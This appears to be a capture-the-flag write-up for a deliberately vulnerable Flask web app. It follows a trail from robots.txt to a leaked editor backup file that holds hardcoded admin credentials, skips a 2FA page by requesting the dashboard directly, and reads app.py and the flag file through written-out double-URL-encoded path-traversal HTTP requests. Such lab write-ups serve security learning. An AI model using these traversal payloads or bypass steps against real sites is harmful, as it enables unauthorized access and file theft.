### robots.txt
```
Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
```
### /.gitignore_test
```
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited
# something about EMACs.

# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!

# static files are stored in the /static directory.
/index/static/login.html~
/index/static/index.html~
/index/static/error.html~
```
### /index/static/login.html~
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
</head>
<body>
    <div>
        <img src="" alt="Image of Alien">
        <form action="{{url_for('index.login')}}" method="POST">
            <!-- TODO: use proper clean CSS stylesheets bruh -->
            <p style="color: red;"> {{ err_msg }} </p>
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
            <label for="Email">Email</label>
            <input value="admin@lunarfiles.muhammadali" type="text" name="email">
			
            <label for="Password">Password</label>
            <!-- just to save time while developing, make sure to remove this in prod !  -->
            <input value="jEJ&(32)DMC<!*###" type="text" name="password">
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
```

- Can ignore the routed `/2FA` by going straight to `/admin/dashboard` as shown in `robots.txt`
- See a manage files tab, viewing the provided makes a request to `/admin/download/<filename>`
- The trick for the LFI is doing an alternating `.././.././.././.././` type pattern, and it must be URL encoded twice
	- Hint for this is indicated in the source code of the `/admin/lunar_files endpoint`
```js
function fetchFileContent(filename) {
	// no need ot URLEncode this is JS argument being pssed in,
	// plug we already URLencoded via flask's | urlencode
	const viewUrl = `/admin/download/${filename}`;
	...
```

- can get `app.py` by sending `GET /admin/download/.././.././.././app.py HTTP/2` double URL encoded:
	- `GET /admin/download/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66app.py HTTP/2`

```python
import os

with open("./FLAG/flag.txt", "r") as f:
    FLAG = f.read()
...
```

- can get `flag.txt` by sending `GET /admin/download/.././.././.././FLAG/flag.txt HTTP/2` double URL encoded
	- `GET /admin/download/%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%66FLAG/flag.txt HTTP/2`
